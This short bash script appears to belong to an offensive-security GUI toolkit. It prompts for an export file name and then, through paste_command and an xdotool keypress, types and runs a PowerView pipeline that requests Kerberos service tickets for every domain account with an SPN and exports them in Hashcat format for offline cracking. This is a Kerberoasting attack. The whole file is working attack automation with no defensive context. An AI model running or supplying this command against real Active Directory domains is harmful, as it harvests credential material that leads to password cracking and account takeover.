#!/bin/bash

: '
PowerShell: Get SPNs, format for Hashcat, export to spns.csv.
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
EXPORT_FILE_FIELD=$(form_item  "export file" "export_file" ".\spns.csv")

# Generate GUI form
generate_form "${EXPORT_FILE_FIELD}"

EXPORT_FILE=${form_data["export_file"]}

paste_command "Get-DomainUser * -SPN -verbose |  Get-DomainSPNTicket -Format Hashcat | Export-Csv ${EXPORT_FILE} -NoTypeInformation"
xdotool key Return
